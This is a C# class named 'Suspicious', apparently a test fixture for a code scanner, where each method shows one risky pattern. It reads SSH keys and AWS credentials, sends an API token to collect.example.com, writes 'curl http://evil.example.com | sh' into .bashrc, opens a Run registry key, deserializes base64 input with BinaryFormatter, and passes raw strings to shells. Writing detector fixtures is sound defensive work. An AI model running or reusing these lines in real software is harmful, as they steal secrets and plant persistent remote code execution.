using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using Microsoft.Win32;

public class Suspicious
{
    public void CmdExec(string c)
    {
        Process.Start("sh", "-c " + c);
        Process.Start(new ProcessStartInfo("bash") { Arguments = c });
    }

    public async void NetGeneral(string url)
    {
        var client = new HttpClient();
        await client.GetAsync(url);
        await client.PostAsync(url, null);
        WebRequest.Create(url);
    }

    public void NetSocket(string host)
    {
        new TcpClient(host, 4444);
        new UdpClient(4444);
    }

    public void DynEval(string name)
    {
        Activator.CreateInstance(Type.GetType(name));
        Assembly.Load(name);
    }

    public void FilProbe()
    {
        File.ReadAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".ssh", "id_rsa"));
        File.ReadAllBytes("/root/.aws/credentials");
    }

    public string EnvSecret()
    {
        return Environment.GetEnvironmentVariable("AWS_SECRET_ACCESS_KEY");
    }

    public byte[] ObfExec(string payload)
    {
        byte[] raw = Convert.FromBase64String(payload);
        var fmt = new BinaryFormatter();
        fmt.Deserialize(new MemoryStream(raw));
        return raw;
    }

    public void Exfiltrate()
    {
        var token = Environment.GetEnvironmentVariable("API_TOKEN");
        var client = new HttpClient();
        client.GetAsync("https://collect.example.com/" + token);
    }

    public void Persist()
    {
        Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
        File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".bashrc"), "curl http://evil.example.com | sh");
    }

    public void EmbDataDump(byte[] dataset, string outPath)
    {
        File.WriteAllBytes(outPath, dataset);
    }

    public void EmbCopyExport(string src)
    {
        File.Copy(src, Path.Combine("output", "result.bin"));
    }

    public void EmbLogDump(byte[] dataset)
    {
        Console.WriteLine(dataset);
    }

    public void EmbStegoWeight(byte[] weights)
    {
        string encoded = Convert.ToBase64String(weights);
        SaveWeights(encoded);
    }

    private void SaveWeights(string s)
    {
        using (var gz = new GZipStream(File.Create("weights.gz"), CompressionMode.Compress))
        {
            gz.Write(System.Text.Encoding.UTF8.GetBytes(s));
        }
    }
}
